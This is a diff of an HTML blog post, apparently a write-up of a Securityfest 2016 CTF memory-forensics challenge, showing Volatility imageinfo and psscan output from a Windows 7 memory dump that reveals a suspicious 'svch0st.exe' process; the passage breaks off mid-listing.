@@ -1,75 +1,4 @@
-<!doctype html><html lang=en><head>
-<meta name=viewport content="width=device-width,initial-scale=1">
-<meta charset=utf-8>
-<meta content="utf-8" http-equiv=encoding>
-<link rel=preload href=/fonts/FiraCode-VariableFont_wght.ttf as=font type=font/ttf crossorigin>
-<link rel=stylesheet href=/css/grid.css type=text/css>
-<link rel=stylesheet href=/css/highlight.css type=text/css>
-<link rel=stylesheet href=/css/main.css type=text/css>
-<meta name=apple-mobile-web-app-title content="dubell.io | Securityfest CTF - Coresec challenge writeup">
-<meta name=apple-mobile-web-app-capable content="yes">
-<meta name=apple-mobile-web-app-status-bar-style content="black-translucent">
-<meta name=twitter:site content="@dubs3c">
-<meta name=twitter:creator content="@dubs3c">
-<meta property="og:title" content="dubell.io | Securityfest CTF - Coresec challenge writeup">
-<meta name=twitter:title content="dubell.io | Securityfest CTF - Coresec challenge writeup">
-<meta itemprop=name content="dubell.io | Securityfest CTF - Coresec challenge writeup">
-<meta name=application-name content="dubell.io | Securityfest CTF - Coresec challenge writeup">
-<meta property="og:site_name" content="dubell.io">
-<meta property="og:article:published_time" content="2016-06-06T00:00:00Z">
-<meta property="article:published_time" content="2016-06-06T00:00:00Z">
-<base href=/www/securityfest-ctf-coresec-challenge-writeup/>
-<link rel=canonical href=/www/securityfest-ctf-coresec-challenge-writeup/ itemprop=url>
-<meta name=url content="/www/securityfest-ctf-coresec-challenge-writeup/">
-<meta name=twitter:url content="/www/securityfest-ctf-coresec-challenge-writeup/">
-<meta property="og:url" content="/www/securityfest-ctf-coresec-challenge-writeup/">
-<meta name=description content>
-<meta itemprop=description content>
-<meta property="og:description" content>
-<meta name=twitter:description content>
-<meta itemprop=image content="/">
-<meta property="og:image" content>
-<meta name=twitter:image content>
-<meta name=twitter:image:src content>
-<meta property="og:updated_time" content="2016-06-06T00:00:00Z">
-<link rel=sitemap type=application/xml title=Sitemap href=sitemap.xml>
-<title>dubell.io | Securityfest CTF - Coresec challenge writeup</title>
-</head><body>
-<div id=particles-js></div>
-<main><div class=row>
-<header class="col center">
-<a href=/ class=noleet><img href=/ class=banner-image src=/img/logo2.png alt=logo></a>
-</div>
-</div>
-<div class=row>
-<div class="col center">
-<nav>
-<fieldset>
-<legend>n4vig4ti0n</legend>
-<ul>
-<li><a href=/>/etc/motd</a></li>
-<li><a href=/www/>/var/www</a></li>
-<li><a href=/mnt/>/mnt</a></li>
-<li><a href=/usr/>/usr</a></li>
-</ul>
-</fieldset>
-</nav>
-</div>
-</div>
-<div class=content>
-<article>
-<h1>Securityfest CTF - Coresec challenge writeup</h1>
-<br>
-<p class=small style=color:#999>
-<a href=/categories/ctf>CTF</a> / June 6, 2016 • 13 min read </p>
-<br>
-<p>This challenge was produced by <a href=http://coresecsystems.com/>Coresec Systems</a> and was released during <a href=https://securityfest.com/>Securityfest</a>. I would liked to have spent more time on it during the event but couldn&rsquo;t really find any time for it. Now the event is over and first year of university is completed, I decided to try to finish the challenge. It was quite tricky at some points but now when I think about it in hindsight, the challenge itself was actually fairly simple. Okey, nuff said let&rsquo;s boogie!</p>
-<h2 id=first-contact>First contact</h2>
-<p>First thing was to download a 330 MB file called <code>coresec-challenge.tar.gz</code>. After downloading the file and unpacking its contents I was presented with a Coresec-CTF-SecurityFest2016.vmem file which is a memory dump of a system. In order to analyze the file I used the <a href=https://github.com/volatilityfoundation/volatility>volatility framework</a> which works great for memory forensics. I relied heavily on this <a href=http://downloads.volatilityfoundation.org/releases/2.4/CheatSheet_v2.4.pdf>cheat sheet</a> to figure out how to solve some of the steps in the challenge.</p>
-<p>First thing to do is to identify which system this memory dump belongs to:</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+<!doctype html><html lang=en><head><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><meta content="utf-8" http-equiv=encoding><link rel=preload href=/fonts/FiraCode-VariableFont_wght.ttf as=font type=font/ttf crossorigin><link rel=stylesheet href=/css/grid.css type=text/css><link rel=stylesheet href=/css/highlight.css type=text/css><link rel=stylesheet href=/css/main.css type=text/css><meta name=apple-mobile-web-app-title content="dubell.io | Securityfest CTF - Coresec challenge writeup"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=twitter:site content="@dubs3c"><meta name=twitter:creator content="@dubs3c"><meta property="og:title" content="dubell.io | Securityfest CTF - Coresec challenge writeup"><meta name=twitter:title content="dubell.io | Securityfest CTF - Coresec challenge writeup"><meta itemprop=name content="dubell.io | Securityfest CTF - Coresec challenge writeup"><meta name=application-name content="dubell.io | Securityfest CTF - Coresec challenge writeup"><meta property="og:site_name" content="dubell.io"><meta property="og:article:published_time" content="2016-06-06T00:00:00Z"><meta property="article:published_time" content="2016-06-06T00:00:00Z"><base href=/www/securityfest-ctf-coresec-challenge-writeup/><link rel=canonical href=/www/securityfest-ctf-coresec-challenge-writeup/ itemprop=url><meta name=url content="/www/securityfest-ctf-coresec-challenge-writeup/"><meta name=twitter:url content="/www/securityfest-ctf-coresec-challenge-writeup/"><meta property="og:url" content="/www/securityfest-ctf-coresec-challenge-writeup/"><meta name=description content><meta itemprop=description content><meta property="og:description" content><meta name=twitter:description content><meta itemprop=image content="/"><meta property="og:image" content><meta name=twitter:image content><meta name=twitter:image:src content><meta property="og:updated_time" content="2016-06-06T00:00:00Z"><link rel=sitemap type=application/xml title=Sitemap href=sitemap.xml><title>dubell.io | Securityfest CTF - Coresec challenge writeup</title></head><body><div id=particles-js></div><main><div class=row><header class="col center"><a href=/ class=noleet><img href=/ class=banner-image src=/img/logo2.png alt=logo></a></div></div><div class=row><div class="col center"><nav><fieldset><legend>n4vig4ti0n</legend><ul><li><a href=/>/etc/motd</a></li><li><a href=/www/>/var/www</a></li><li><a href=/mnt/>/mnt</a></li><li><a href=/usr/>/usr</a></li></ul></fieldset></nav></div></div><div class=content><article><h1>Securityfest CTF - Coresec challenge writeup</h1><br><p class=small style=color:#999><a href=/categories/ctf>CTF</a> / June 6, 2016 • 13 min read</p><br><p>This challenge was produced by <a href=http://coresecsystems.com/>Coresec Systems</a> and was released during <a href=https://securityfest.com/>Securityfest</a>. I would liked to have spent more time on it during the event but couldn&rsquo;t really find any time for it. Now the event is over and first year of university is completed, I decided to try to finish the challenge. It was quite tricky at some points but now when I think about it in hindsight, the challenge itself was actually fairly simple. Okey, nuff said let&rsquo;s boogie!</p><h2 id=first-contact>First contact</h2><p>First thing was to download a 330 MB file called <code>coresec-challenge.tar.gz</code>. After downloading the file and unpacking its contents I was presented with a Coresec-CTF-SecurityFest2016.vmem file which is a memory dump of a system. In order to analyze the file I used the <a href=https://github.com/volatilityfoundation/volatility>volatility framework</a> which works great for memory forensics. I relied heavily on this <a href=http://downloads.volatilityfoundation.org/releases/2.4/CheatSheet_v2.4.pdf>cheat sheet</a> to figure out how to solve some of the steps in the challenge.</p><p>First thing to do is to identify which system this memory dump belongs to:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -85,31 +14,23 @@
 </span><span class=lnt>14
 </span><span class=lnt>15
 </span><span class=lnt>16
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ ./volatility_2.4_x64 -f Coresec-CTF-SecurityFest2016.vmem imageinfo
-Volatility Foundation Volatility Framework 2.4
-Determining profile based on KDBG search...
-
-          Suggested Profile<span class=o>(</span>s<span class=o>)</span> : Win7SP0x64, Win7SP1x64, Win2008R2SP0x64, Win2008R2SP1x64 <span class=o>(</span>Instantiated with Win7SP0x64<span class=o>)</span>
-                     AS Layer1 : AMD64PagedMemory <span class=o>(</span>Kernel AS<span class=o>)</span>
-                     AS Layer2 : FileAddressSpace <span class=o>(</span>/Users/michaeldubell/Downloads/volatility_2.4.mac.standalone/Coresec-CTF-SecurityFest2016.vmem<span class=o>)</span>
-                      PAE <span class=nb>type</span> : No PAE
-                           DTB : 0x187000L
-                          KDBG : 0xf80002a450a0
-          Number of Processors : <span class=m>1</span>
-     Image Type <span class=o>(</span>Service Pack<span class=o>)</span> : <span class=m>1</span>
-                KPCR <span class=k>for</span> CPU <span class=m>0</span> : 0xfffff80002a46d00L
-             KUSER_SHARED_DATA : 0xfffff78000000000L
-           Image date and <span class=nb>time</span> : 2016-06-02 07:50:46 UTC+0000
-     Image <span class=nb>local</span> date and <span class=nb>time</span> : 2016-06-02 09:50:46 +0200
-</code></pre></td></tr></table>
-</div>
-</div><p>As we can see volatility suggest that we use the Win7SP0x64 profile which indicates that the system is probably a Windows 7 x64 system. Now that I have identified the correct profile, I could begin looking for clues.</p>
-<p>First thing I did was to dump all the running processes to see if there was any interesting software running.</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ./volatility_2.4_x64 -f Coresec-CTF-SecurityFest2016.vmem imageinfo
+</span></span><span class=line><span class=cl>Volatility Foundation Volatility Framework 2.4
+</span></span><span class=line><span class=cl>Determining profile based on KDBG search...
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>          Suggested Profile<span class=o>(</span>s<span class=o>)</span> : Win7SP0x64, Win7SP1x64, Win2008R2SP0x64, Win2008R2SP1x64 <span class=o>(</span>Instantiated with Win7SP0x64<span class=o>)</span>
+</span></span><span class=line><span class=cl>                     AS Layer1 : AMD64PagedMemory <span class=o>(</span>Kernel AS<span class=o>)</span>
+</span></span><span class=line><span class=cl>                     AS Layer2 : FileAddressSpace <span class=o>(</span>/Users/michaeldubell/Downloads/volatility_2.4.mac.standalone/Coresec-CTF-SecurityFest2016.vmem<span class=o>)</span>
+</span></span><span class=line><span class=cl>                      PAE <span class=nb>type</span> : No PAE
+</span></span><span class=line><span class=cl>                           DTB : 0x187000L
+</span></span><span class=line><span class=cl>                          KDBG : 0xf80002a450a0
+</span></span><span class=line><span class=cl>          Number of Processors : <span class=m>1</span>
+</span></span><span class=line><span class=cl>     Image Type <span class=o>(</span>Service Pack<span class=o>)</span> : <span class=m>1</span>
+</span></span><span class=line><span class=cl>                KPCR <span class=k>for</span> CPU <span class=m>0</span> : 0xfffff80002a46d00L
+</span></span><span class=line><span class=cl>             KUSER_SHARED_DATA : 0xfffff78000000000L
+</span></span><span class=line><span class=cl>           Image date and <span class=nb>time</span> : 2016-06-02 07:50:46 UTC+0000
+</span></span><span class=line><span class=cl>     Image <span class=nb>local</span> date and <span class=nb>time</span> : 2016-06-02 09:50:46 +0200
+</span></span></code></pre></td></tr></table></div></div><p>As we can see volatility suggest that we use the Win7SP0x64 profile which indicates that the system is probably a Windows 7 x64 system. Now that I have identified the correct profile, I could begin looking for clues.</p><p>First thing I did was to dump all the running processes to see if there was any interesting software running.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -167,73 +88,65 @@ Determining profile based on KDBG search...
 </span><span class=lnt>56
 </span><span class=lnt>57
 </span><span class=lnt>58
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ ./volatility_2.4_x64 -f Coresec-CTF-SecurityFest2016.vmem --profile<span class=o>=</span>Win7SP0x64 psscan
-Volatility Foundation Volatility Framework 2.4
-Offset<span class=o>(</span>P<span class=o>)</span>          Name                PID   PPID PDB                Time created                   Time exited
------------------- ---------------- ------ ------ ------------------ ------------------------------ ------------------------------
-0x0000000004dfab30 iexplore.exe        <span class=m>800</span>   <span class=m>1820</span> 0x000000003cb43000 2016-06-02 07:49:58 UTC+0000
-0x0000000021075360 svchost.exe         <span class=m>724</span>    <span class=m>476</span> 0x000000003785c000 2016-06-02 07:46:19 UTC+0000
-0x000000003dacb060 sppsvc.exe          <span class=m>584</span>    <span class=m>476</span> 0x000000001117f000 2016-06-02 07:48:21 UTC+0000
-0x000000003daf8920 AdobeARM.exe       <span class=m>2980</span>   <span class=m>2628</span> 0x000000001ec80000 2016-06-02 07:47:19 UTC+0000
-0x000000003dbaf7c0 svch0st.exe        <span class=m>1628</span>   <span class=m>1820</span> 0x00000000381c8000 2016-06-02 07:49:57 UTC+0000
-0x000000003dc13730 taskhost.exe       <span class=m>1752</span>    <span class=m>476</span> 0x00000000307a5000 2016-06-02 07:46:25 UTC+0000
-0x000000003dc15320 dwm.exe            <span class=m>1808</span>    <span class=m>812</span> 0x0000000030375000 2016-06-02 07:46:25 UTC+0000
-0x000000003dc33900 svchost.exe        <span class=m>1276</span>    <span class=m>476</span> 0x000000002e6e0000 2016-06-02 07:46:21 UTC+0000
-0x000000003dcddb30 explorer.exe       <span class=m>1820</span>   <span class=m>1788</span> 0x00000000302f9000 2016-06-02 07:46:25 UTC+0000
-0x000000003de19b30 audiodg.exe         <span class=m>956</span>    <span class=m>724</span> 0x00000000397ee000 2016-06-02 07:46:19 UTC+0000
-0x000000003de72640 svchost.exe         <span class=m>300</span>    <span class=m>476</span> 0x0000000038c7d000 2016-06-02 07:46:20 UTC+0000
-0x000000003de9c360 svchost.exe         <span class=m>900</span>    <span class=m>476</span> 0x0000000032985000 2016-06-02 07:46:20 UTC+0000
-0x000000003df3b6c0 spoolsv.exe        <span class=m>1096</span>    <span class=m>476</span> 0x000000002f1d3000 2016-06-02 07:46:20 UTC+0000
-0x000000003df75740 svchost.exe        <span class=m>1132</span>    <span class=m>476</span> 0x0000000033d6a000 2016-06-02 07:46:20 UTC+0000
-0x000000003dfb9b30 armsvc.exe         <span class=m>1240</span>    <span class=m>476</span> 0x0000000033772000 2016-06-02 07:46:20 UTC+0000
-0x000000003e020740 services.exe        <span class=m>476</span>    <span class=m>384</span> 0x0000000039e06000 2016-06-02 07:46:19 UTC+0000
-0x000000003e022690 lsm.exe             <span class=m>492</span>    <span class=m>384</span> 0x00000000063ae000 2016-06-02 07:46:19 UTC+0000
-0x000000003e02a700 lsass.exe           <span class=m>484</span>    <span class=m>384</span> 0x00000000060a7000 2016-06-02 07:46:19 UTC+0000
-0x000000003e10a290 svchost.exe         <span class=m>604</span>    <span class=m>476</span> 0x00000000389cb000 2016-06-02 07:46:19 UTC+0000
-0x000000003e125060 svchost.exe         <span class=m>672</span>    <span class=m>476</span> 0x0000000037d0f000 2016-06-02 07:46:19 UTC+0000
-0x000000003e18f430 svchost.exe         <span class=m>812</span>    <span class=m>476</span> 0x000000003c4a3000 2016-06-02 07:46:19 UTC+0000
-0x000000003e1ac730 SearchIndexer.     <span class=m>1988</span>    <span class=m>476</span> 0x000000002a0bb000 2016-06-02 07:46:31 UTC+0000
-0x000000003e1f5380 svchost.exe         <span class=m>892</span>    <span class=m>476</span> 0x0000000039db3000 2016-06-02 07:46:19 UTC+0000
-0x000000003e200910 csrss.exe           <span class=m>392</span>    <span class=m>376</span> 0x000000003ba53000 2016-06-02 07:46:18 UTC+0000
-0x000000003e216060 mscorsvw.exe       <span class=m>3056</span>    <span class=m>476</span> 0x00000000102f7000 2016-06-02 07:48:21 UTC+0000
-0x000000003e24eb30 AcroRd32.exe       <span class=m>2628</span>   <span class=m>1820</span> 0x000000000196a000 2016-06-02 07:46:47 UTC+0000
-0x000000003e29f2a0 RdrCEF.exe         <span class=m>2880</span>   <span class=m>2716</span> 0x000000001243f000 2016-06-02 07:46:48 UTC+0000
-0x000000003e2c3920 notepad.exe        <span class=m>2548</span>   <span class=m>1820</span> 0x000000001caf5000 2016-06-02 07:46:45 UTC+0000
-0x000000003e2c5b30 SearchProtocol     <span class=m>2556</span>   <span class=m>1988</span> 0x0000000026568000 2016-06-02 07:46:45 UTC+0000
-0x000000003e2d9420 mscorsvw.exe       <span class=m>1052</span>    <span class=m>476</span> 0x000000003bf9e000 2016-06-02 07:48:21 UTC+0000
-0x000000003e2db060 WINWORD.EXE        <span class=m>1116</span>   <span class=m>1820</span> 0x000000003bfdb000 2016-06-02 07:48:14 UTC+0000
-0x000000003e328b30 OSPPSVC.EXE        <span class=m>2328</span>    <span class=m>476</span> 0x0000000006407000 2016-06-02 07:46:57 UTC+0000
-0x000000003e3bb060 winlogon.exe        <span class=m>432</span>    <span class=m>376</span> 0x000000003acd9000 2016-06-02 07:46:18 UTC+0000
-0x000000003e598450 csrss.exe           <span class=m>336</span>    <span class=m>320</span> 0x00000000114cc000 2016-06-02 07:46:17 UTC+0000
-0x000000003e5ce060 svchost.exe         <span class=m>880</span>    <span class=m>476</span> 0x000000000b38d000 2016-06-02 07:48:21 UTC+0000
-0x000000003e5d3b30 cmd.exe            <span class=m>2756</span>   <span class=m>1820</span> 0x00000000248d7000 2016-06-02 07:49:55 UTC+0000
-0x000000003e5ef740 AcroRd32.exe       <span class=m>2672</span>   <span class=m>2628</span> 0x000000001819e000 2016-06-02 07:46:47 UTC+0000
-0x000000003e5f3b30 RdrCEF.exe         <span class=m>2716</span>   <span class=m>2628</span> 0x000000001a1b7000 2016-06-02 07:46:48 UTC+0000
-0x000000003ea58060 firefox.exe         <span class=m>992</span>   <span class=m>1820</span> 0x00000000226d1000 2016-06-02 07:46:32 UTC+0000
-0x000000003ed96310 smss.exe            <span class=m>260</span>      <span class=m>4</span> 0x000000001c821000 2016-06-02 07:46:17 UTC+0000
-0x000000003edb1290 iexplore.exe       <span class=m>1200</span>    <span class=m>800</span> 0x00000000084cc000 2016-06-02 07:49:59 UTC+0000
-0x000000003fc23b30 SearchProtocol     <span class=m>2204</span>   <span class=m>1988</span> 0x0000000002e42000 2016-06-02 07:50:21 UTC+0000
-0x000000003fc45b30 WMIADAP.exe         <span class=m>284</span>    <span class=m>892</span> 0x000000002c440000 2016-06-02 07:50:21 UTC+0000   2016-06-02 07:50:44 UTC+0000
-0x000000003fc69b30 cmd.exe            <span class=m>3596</span>   <span class=m>1544</span> 0x000000002efec000 2016-06-02 07:50:44 UTC+0000
-0x000000003fc74060 PING.EXE           <span class=m>3604</span>   <span class=m>3596</span> 0x0000000011f92000 2016-06-02 07:50:44 UTC+0000
-0x000000003fc86060 WmiPrvSE.exe       <span class=m>3044</span>    <span class=m>604</span> 0x00000000030f6000 2016-06-02 07:50:21 UTC+0000
-0x000000003fc9f060 conhost.exe        <span class=m>2708</span>    <span class=m>392</span> 0x0000000021fa6000 2016-06-02 07:49:57 UTC+0000
-0x000000003fca0530 conhost.exe        <span class=m>2028</span>    <span class=m>392</span> 0x000000002535c000 2016-06-02 07:49:55 UTC+0000
-0x000000003fca0b30 SearchFilterHo      <span class=m>144</span>   <span class=m>1988</span> 0x000000001695b000 2016-06-02 07:49:32 UTC+0000
-0x000000003fd24630 taskhost.exe        <span class=m>168</span>    <span class=m>476</span> 0x000000002b7f8000 2016-06-02 07:49:20 UTC+0000
-0x000000003fd34850 svch0st.exe        <span class=m>1544</span>   <span class=m>1628</span> 0x0000000019118000 2016-06-02 07:49:57 UTC+0000
-0x000000003fe07b30 splwow64.exe       <span class=m>2232</span>   <span class=m>1116</span> 0x000000003f645000 2016-06-02 07:48:29 UTC+0000
-0x000000003fea3060 wininit.exe         <span class=m>384</span>    <span class=m>320</span> 0x000000003be52000 2016-06-02 07:46:18 UTC+0000
-0x000000003fedf450 System                <span class=m>4</span>      <span class=m>0</span> 0x0000000000187000 2016-06-02 07:46:17 UTC+0000
-</code></pre></td></tr></table>
-</div>
-</div><p>As you can see in the process list, we have WINWORD.exe, firefox.exe, cmd.exe, notepad.exe and PING.exe running. Perhaps what we are looking for can be found within these programs.</p>
-<p>My next step was to dump a list of all the files contained in the image. The full list is too large so I&rsquo;ll only show small portion.</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ./volatility_2.4_x64 -f Coresec-CTF-SecurityFest2016.vmem --profile<span class=o>=</span>Win7SP0x64 psscan
+</span></span><span class=line><span class=cl>Volatility Foundation Volatility Framework 2.4
+</span></span><span class=line><span class=cl>Offset<span class=o>(</span>P<span class=o>)</span>          Name                PID   PPID PDB                Time created                   Time exited
+</span></span><span class=line><span class=cl>------------------ ---------------- ------ ------ ------------------ ------------------------------ ------------------------------
+</span></span><span class=line><span class=cl>0x0000000004dfab30 iexplore.exe        <span class=m>800</span>   <span class=m>1820</span> 0x000000003cb43000 2016-06-02 07:49:58 UTC+0000
+</span></span><span class=line><span class=cl>0x0000000021075360 svchost.exe         <span class=m>724</span>    <span class=m>476</span> 0x000000003785c000 2016-06-02 07:46:19 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003dacb060 sppsvc.exe          <span class=m>584</span>    <span class=m>476</span> 0x000000001117f000 2016-06-02 07:48:21 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003daf8920 AdobeARM.exe       <span class=m>2980</span>   <span class=m>2628</span> 0x000000001ec80000 2016-06-02 07:47:19 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003dbaf7c0 svch0st.exe        <span class=m>1628</span>   <span class=m>1820</span> 0x00000000381c8000 2016-06-02 07:49:57 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003dc13730 taskhost.exe       <span class=m>1752</span>    <span class=m>476</span> 0x00000000307a5000 2016-06-02 07:46:25 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003dc15320 dwm.exe            <span class=m>1808</span>    <span class=m>812</span> 0x0000000030375000 2016-06-02 07:46:25 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003dc33900 svchost.exe        <span class=m>1276</span>    <span class=m>476</span> 0x000000002e6e0000 2016-06-02 07:46:21 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003dcddb30 explorer.exe       <span class=m>1820</span>   <span class=m>1788</span> 0x00000000302f9000 2016-06-02 07:46:25 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003de19b30 audiodg.exe         <span class=m>956</span>    <span class=m>724</span> 0x00000000397ee000 2016-06-02 07:46:19 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003de72640 svchost.exe         <span class=m>300</span>    <span class=m>476</span> 0x0000000038c7d000 2016-06-02 07:46:20 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003de9c360 svchost.exe         <span class=m>900</span>    <span class=m>476</span> 0x0000000032985000 2016-06-02 07:46:20 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003df3b6c0 spoolsv.exe        <span class=m>1096</span>    <span class=m>476</span> 0x000000002f1d3000 2016-06-02 07:46:20 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003df75740 svchost.exe        <span class=m>1132</span>    <span class=m>476</span> 0x0000000033d6a000 2016-06-02 07:46:20 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003dfb9b30 armsvc.exe         <span class=m>1240</span>    <span class=m>476</span> 0x0000000033772000 2016-06-02 07:46:20 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003e020740 services.exe        <span class=m>476</span>    <span class=m>384</span> 0x0000000039e06000 2016-06-02 07:46:19 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003e022690 lsm.exe             <span class=m>492</span>    <span class=m>384</span> 0x00000000063ae000 2016-06-02 07:46:19 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003e02a700 lsass.exe           <span class=m>484</span>    <span class=m>384</span> 0x00000000060a7000 2016-06-02 07:46:19 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003e10a290 svchost.exe         <span class=m>604</span>    <span class=m>476</span> 0x00000000389cb000 2016-06-02 07:46:19 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003e125060 svchost.exe         <span class=m>672</span>    <span class=m>476</span> 0x0000000037d0f000 2016-06-02 07:46:19 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003e18f430 svchost.exe         <span class=m>812</span>    <span class=m>476</span> 0x000000003c4a3000 2016-06-02 07:46:19 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003e1ac730 SearchIndexer.     <span class=m>1988</span>    <span class=m>476</span> 0x000000002a0bb000 2016-06-02 07:46:31 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003e1f5380 svchost.exe         <span class=m>892</span>    <span class=m>476</span> 0x0000000039db3000 2016-06-02 07:46:19 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003e200910 csrss.exe           <span class=m>392</span>    <span class=m>376</span> 0x000000003ba53000 2016-06-02 07:46:18 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003e216060 mscorsvw.exe       <span class=m>3056</span>    <span class=m>476</span> 0x00000000102f7000 2016-06-02 07:48:21 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003e24eb30 AcroRd32.exe       <span class=m>2628</span>   <span class=m>1820</span> 0x000000000196a000 2016-06-02 07:46:47 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003e29f2a0 RdrCEF.exe         <span class=m>2880</span>   <span class=m>2716</span> 0x000000001243f000 2016-06-02 07:46:48 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003e2c3920 notepad.exe        <span class=m>2548</span>   <span class=m>1820</span> 0x000000001caf5000 2016-06-02 07:46:45 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003e2c5b30 SearchProtocol     <span class=m>2556</span>   <span class=m>1988</span> 0x0000000026568000 2016-06-02 07:46:45 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003e2d9420 mscorsvw.exe       <span class=m>1052</span>    <span class=m>476</span> 0x000000003bf9e000 2016-06-02 07:48:21 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003e2db060 WINWORD.EXE        <span class=m>1116</span>   <span class=m>1820</span> 0x000000003bfdb000 2016-06-02 07:48:14 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003e328b30 OSPPSVC.EXE        <span class=m>2328</span>    <span class=m>476</span> 0x0000000006407000 2016-06-02 07:46:57 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003e3bb060 winlogon.exe        <span class=m>432</span>    <span class=m>376</span> 0x000000003acd9000 2016-06-02 07:46:18 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003e598450 csrss.exe           <span class=m>336</span>    <span class=m>320</span> 0x00000000114cc000 2016-06-02 07:46:17 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003e5ce060 svchost.exe         <span class=m>880</span>    <span class=m>476</span> 0x000000000b38d000 2016-06-02 07:48:21 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003e5d3b30 cmd.exe            <span class=m>2756</span>   <span class=m>1820</span> 0x00000000248d7000 2016-06-02 07:49:55 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003e5ef740 AcroRd32.exe       <span class=m>2672</span>   <span class=m>2628</span> 0x000000001819e000 2016-06-02 07:46:47 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003e5f3b30 RdrCEF.exe         <span class=m>2716</span>   <span class=m>2628</span> 0x000000001a1b7000 2016-06-02 07:46:48 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003ea58060 firefox.exe         <span class=m>992</span>   <span class=m>1820</span> 0x00000000226d1000 2016-06-02 07:46:32 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003ed96310 smss.exe            <span class=m>260</span>      <span class=m>4</span> 0x000000001c821000 2016-06-02 07:46:17 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003edb1290 iexplore.exe       <span class=m>1200</span>    <span class=m>800</span> 0x00000000084cc000 2016-06-02 07:49:59 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003fc23b30 SearchProtocol     <span class=m>2204</span>   <span class=m>1988</span> 0x0000000002e42000 2016-06-02 07:50:21 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003fc45b30 WMIADAP.exe         <span class=m>284</span>    <span class=m>892</span> 0x000000002c440000 2016-06-02 07:50:21 UTC+0000   2016-06-02 07:50:44 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003fc69b30 cmd.exe            <span class=m>3596</span>   <span class=m>1544</span> 0x000000002efec000 2016-06-02 07:50:44 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003fc74060 PING.EXE           <span class=m>3604</span>   <span class=m>3596</span> 0x0000000011f92000 2016-06-02 07:50:44 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003fc86060 WmiPrvSE.exe       <span class=m>3044</span>    <span class=m>604</span> 0x00000000030f6000 2016-06-02 07:50:21 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003fc9f060 conhost.exe        <span class=m>2708</span>    <span class=m>392</span> 0x0000000021fa6000 2016-06-02 07:49:57 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003fca0530 conhost.exe        <span class=m>2028</span>    <span class=m>392</span> 0x000000002535c000 2016-06-02 07:49:55 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003fca0b30 SearchFilterHo      <span class=m>144</span>   <span class=m>1988</span> 0x000000001695b000 2016-06-02 07:49:32 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003fd24630 taskhost.exe        <span class=m>168</span>    <span class=m>476</span> 0x000000002b7f8000 2016-06-02 07:49:20 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003fd34850 svch0st.exe        <span class=m>1544</span>   <span class=m>1628</span> 0x0000000019118000 2016-06-02 07:49:57 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003fe07b30 splwow64.exe       <span class=m>2232</span>   <span class=m>1116</span> 0x000000003f645000 2016-06-02 07:48:29 UTC+0000
